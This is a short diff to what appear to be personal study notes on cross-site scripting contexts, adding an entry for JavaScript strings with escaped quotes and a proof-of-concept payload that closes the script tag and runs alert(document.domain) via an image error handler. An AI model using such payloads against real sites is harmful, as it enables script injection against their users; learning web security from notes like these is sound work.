@@ -9,4 +9,6 @@ DOM-based XSS :
 Cross-site scripting contexts :
     XSS between HTML tags
     XSS in HTML tag attributes
-    XSS into JavaScript
+    XSS into JavaScript :
+        JavaScript string with single quote and backslash escaped :
+            </script><img src=1 onerror=alert(document.domain)>
